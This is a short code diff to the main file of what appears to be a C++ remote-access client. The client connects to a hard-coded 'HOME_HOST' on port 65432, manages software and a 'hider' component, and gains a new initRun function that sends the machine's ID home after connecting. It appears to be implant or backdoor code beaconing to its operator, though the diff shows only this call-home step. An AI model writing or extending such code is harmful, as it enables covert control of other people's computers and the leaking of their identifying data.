@@ -10,11 +10,13 @@
 #include "Listener.h"
 #include "Connection.h"
 #include "../IncludeCPP/globalDefines.h"
+#include "../IncludeCPP/getBasicInfo.h"
 
 #define PORT (65432)
 
 void loopIter(std::shared_ptr<Connection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
-void testSoftwareManeger(void);
+
+int initRun(std::shared_ptr<Connection> conn);
 
 int main() {
     
@@ -24,6 +26,7 @@ int main() {
     if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
         exit(EXIT_FAILURE);
     }
+
 
 
     bool cont = true;
@@ -36,6 +39,18 @@ int main() {
     return EXIT_SUCCESS;
 }
 
+// perform stuff after connection to home creation
+// meant for sending information required for operation
+int initRun(std::shared_ptr<Connection> conn) {
+
+
+    if (conn->sendString(getMachineID(), true) == false) {
+        std::cerr << "error sending machine id" << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+    return 0;
+}
 
 
 
